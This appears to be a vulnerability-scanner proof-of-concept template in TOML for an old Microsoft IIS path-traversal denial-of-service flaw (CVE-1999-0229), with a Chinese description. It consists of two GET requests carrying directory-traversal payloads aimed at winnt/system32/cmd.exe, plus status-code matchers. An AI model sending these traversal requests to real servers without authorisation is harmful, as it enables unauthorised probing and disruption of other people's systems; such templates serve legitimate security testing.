[info]
id = "POC-AVE-1999-0026"
name = "Microsoft IIS ..\\.. 路径遍历拒绝服务漏洞 PoC"
author = "AVE"
severity = "medium"
tags = ["dos", "path-traversal", "iis"]
description = "Microsoft Windows NT IIS 服务器在处理包含 ..\\\\.. 的路径时存在拒绝服务漏洞，远程攻击者可导致服务器无响应。"
vuln_id = ["CVE-1999-0229", "AVE-1999-0026"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/scripts/..%5c../winnt/system32/cmd.exe"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = false

[[poc.requests]]
method = "GET"
path = "/scripts/..\\../winnt/system32/cmd.exe"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = false
